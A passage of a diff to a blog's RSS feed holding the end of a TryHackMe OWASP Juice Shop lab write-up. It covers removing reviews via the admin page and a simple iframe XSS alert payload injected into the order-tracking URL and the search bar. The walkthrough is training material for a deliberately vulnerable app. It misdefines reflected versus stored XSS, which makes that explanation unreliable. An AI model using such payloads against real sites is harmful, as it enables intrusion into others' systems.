-&lt;p&gt;Finally, for the this task need to delete all five-star reviews. Back at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;administration&lt;/code&gt; page, we can see all the reviews. All we need to do here is delete the only five-star review by clicking on the trash can next to the review.
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;cross-site-scripting&quot;&gt;Cross Site Scripting&lt;/h2&gt;
-
-&lt;p&gt;Cross site scripting, also known as XSS, involves injecting malicious JavaScript into a website. There are two kinds of XSS, reflected and non-reflected. Reflected is stored into the server of the web app, and non-reflected is not. This task wants us to perform an attack using the tracking orders, and using the search field. I’ll be using a basic XSS payload that simply shows a popup on the screen, I’ll use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iframe&lt;/code&gt; tag because THM says so.&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;iframe src=&quot;javascript:alert('Hacked By a Trashy Boii')&quot;&amp;gt;&lt;/code&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;The first question deals with the Tracking Orders page. Simplay going to the page shows us an input for the order number. If you take a look at the URL at the top of the page, we get an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;...?id=ORDERNUMBER&lt;/code&gt;. If we replace the ORDERNUMBER with our properly formatted payload we should get a reflected XSS attack. Because of the spaces in the string I shortened my message.
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_hack.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;The payload for the search bar is easier, we can simply paste our xss payload into the search bar and get the following popup.
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_hacked.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;after-tryhackme&quot;&gt;After TryHackMe&lt;/h2&gt;
-
-&lt;p&gt;Again, this room is actually a pretty well known application that can teach you all kinds of things about web application security. The creator has a really great and detailed writeup and documentation of not only all the TryHackMe tasks, but other more and less challenging exploits on this application &lt;a href=&quot;https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/&quot;&gt;here&lt;/a&gt;. I’m planning on continuing to spin up this box on THM and play around with it to see what I can find. Thanks for reading!
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-</description>
-        <pubDate>Fri, 07 Aug 2020 00:00:00 -0500</pubDate>
-        <link>http://localhost:8000//OWASPJuiceShop</link>
-        <link href="http://localhost:8000/OWASPJuiceShop"/>
-        <guid isPermaLink="true">http://localhost:8000/OWASPJuiceShop</guid>
       </item>
     
   </channel>
